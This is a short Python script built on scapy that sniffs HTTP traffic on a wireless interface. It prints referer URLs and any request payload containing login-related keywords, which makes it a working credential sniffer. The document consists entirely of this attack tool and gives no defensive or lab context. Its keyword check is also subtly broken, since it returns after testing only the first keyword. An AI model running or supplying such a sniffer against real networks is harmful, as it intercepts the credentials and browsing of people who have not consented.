#! /usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniff_packet)

def get_url(packets):
    http_data = str(packets[http.HTTPRequest].Referer).strip('b').strip("'")
    return http_data

def get_login_info(packets):
    if packets.haslayer(scapy.Raw):
        load = str(packets[scapy.Raw].load).strip('b').strip("'")
        keywords = ["username", "user", "email", "password", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                return load
            else:
                return

def process_sniff_packet(packets):
    if packets.haslayer(http.HTTPRequest):
        http_data = get_url(packets)
        if http_data != 'None':
            print("[+] URL >> "+ http_data)
        login_info = get_login_info(packets)
        if login_info is not None:
            print("\n"+login_info+"\n")

sniff("wlan0")
print()